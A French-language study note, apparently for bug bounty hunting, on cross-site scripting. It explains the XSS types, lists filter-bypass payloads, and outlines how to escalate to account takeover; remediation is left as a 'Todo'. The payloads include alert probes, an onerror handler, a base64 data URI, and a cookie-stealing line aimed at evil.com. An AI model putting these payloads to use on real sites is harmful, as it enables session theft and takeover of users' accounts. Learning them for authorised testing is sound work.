# XSS (Cross Site Scripting)
## Qu'est ce qu'une XSS

C'est le fait de pouvoir injecter un script que ça soit en JS, HTML, Flash, VBScript ou tout autre langage susceptible d'être exécuté par le navigateur. 

Nous injectons notre code, si l'ordinateur comprends ce que l'on a donné un input et qu'il l'exécute, alors la XSS est confirmée. 

## Types de XSS

### Stored (Stockée)

Les **XSS** de type stockées, sont des injections de scripts qui sont enregistrés en serveur, et appelées de manière non ou mal sécurisée. 

Il s'agit de la XSS la plus critique car elle touche un plus grand nombre d'utilisateur à contrario des autres types de XSS. 

### Blind XSS

Les XSS de type blind sont des XSS de type Stockée, mais qui est exécutée sur un autre endroit du serveur.

Par exemple, on envoie un mail à l'admin via un formulaire de contact, l'admin ouvre sur l'interface d'administration et se prends la XSS.

Elle est souvent utilisée pour de l'**Account Takeover** et de l'**Exfiltration de données** d'administrateurs, mais elle en reste la plus compliquée pour être détectée car aucun élément visuel nous permet de voir que l'injection à été fonctionnelle.

### Reflected XSS

La Reflected envoie le code malicieux au serveur, qui exécute le script et retourne aussitôt le résultat sans pour autant la stocker. 

Exemple, si nous faisons une recherche dans un site pour un produit, et que dans l'url nous avons le résultat de notre recherche, alors nous pouvons tenter une XSS:

>*"https://mon-url/products/search?q=<script>alert(1)</script>"

Si l'injection fonctionne, alors on l'envoie à un utilisateur et il déclenchera l'injection.

### DOM XSS

La Dom XSS est à peu près similaire à la Reflected, à la différence que l'injection n'appelle pas le serveur, mais est executée directement sur la copie locale du client. 

La Dom XSS est due au rendu de l'input utilisateur sur le client de manière non sécurisée.

Cependant attention, car **TOUT** ne se passe pas forcément sur un paramètre d'url.

### Self XSS

La self XSS est une XSS qui nécessite l'interaction utilisateur et donc, agit comme un "phishing", et donc est globalement exclue des programmes de BB.

## Bypass de filtre

Pour bypass les filtres:
- essayer de fermer l'input :   '<img src="**"/><script>alert(1)</script></img>**'
- essayer d'utiliser directement des commandes js: '<img src="**\javascript:alert(1)"**></img>'
- essayer de jouer avec les fonctions d'appel js : '<img src="**123" onerror="alert(1)"**>'
- encoder avec le datafilter : "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
- Capitaliser : "<scRiPT>location='http://evil.com/c='+document.cookie;</scRiPT>"
- Si quote et double quote filtrées, utiliser String.fromCharCode pour forger sa string
- Contourner la logique des filtres : "<scrip<script>t>alert(1)</scrip</script>t>"
### Escalade de la vulnérabilité

Avec les XSS, on peut évoluer sa criticité en passant d'une xss simple à un Account Takeover en volant par exemple les creds d'un admin.

On peut aussi effectuer une IDOR en volant l'id d'un compte et tenter d'accéder à des données qui ne nous appartiennent pas.

Ou bien même également RCE si on exécute les scripts avec les droits d'administrateur.

Et voir aussi compromettre l'intégrité totale du site en fonction des droits des utilisateurs.

---

*Todo: Correctifs associés à cette Vulnérabilité*
